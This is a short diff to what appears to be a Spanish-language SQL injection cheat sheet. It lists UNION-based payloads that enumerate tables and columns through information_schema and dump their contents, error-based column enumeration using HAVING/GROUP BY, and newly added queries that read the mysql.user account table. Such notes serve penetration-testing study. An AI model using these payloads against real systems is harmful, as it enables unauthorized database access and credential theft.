@@ -209,6 +209,8 @@ Ponemos ' o ; y si es vulnerable, a probar
 ' union select distinct(table_name), null from information_schema.columns;# Para ver las tablas que hay
 ' union select distinct(column_name), null from information_schema.columns;# Para ver las columnas que hay
 ' union select * from tabla_a_ver;# Para ver contenido
+SELECT * FROM mysql.user
+SELECT User from mysql.user
 
 Enumeración de columnas:
 ' having 1=1-- al no tener el group by, dará error y puede mostrar la columna. Después hacemos ' group by [tabla.columna mostrada] having 1=1-- y mostrará la siguiente. Después concatenamos ' group by [tabla.columna mostrada], [tabla.columna mostrada2] having 1=1-- Hasta que no dé error
